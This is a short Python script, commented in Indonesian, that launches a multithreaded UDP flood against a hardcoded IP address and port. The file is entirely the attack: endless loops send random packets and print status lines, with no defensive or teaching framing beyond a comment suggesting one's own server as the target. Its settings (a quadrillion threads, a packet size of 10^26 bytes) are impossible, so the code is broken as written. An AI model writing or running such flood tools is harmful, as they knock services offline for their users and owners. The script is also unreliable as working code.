import socket
import random
import threading

# Ganti dengan IP dan port server milikmu
TARGET_IP = "204.10.193.119"
TARGET_PORT = 7132

# Jumlah thread paralel
THREADS = 1000000000000000

# Ukuran paket (dalam byte)
PACKET_SIZE = 100000000000000000000000000

def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(PACKET_SIZE)

    while True:
        try:
            sock.sendto(bytes_data, (TARGET_IP, TARGET_PORT))
            print(f"[+] Paket dikirim ke {TARGET_IP}:{TARGET_PORT}")
        except Exception as e:
            print(f"[-] Gagal mengirim: {e}")

# Jalankan thread flood
print(f"[•] Menjalankan UDP flood ke {TARGET_IP}:{TARGET_PORT} dengan {THREADS} threads...")
for i in range(THREADS):
    t = threading.Thread(target=udp_flood)
    t.daemon = True
    t.start()

# Agar program tetap jalan
while True:
    pass
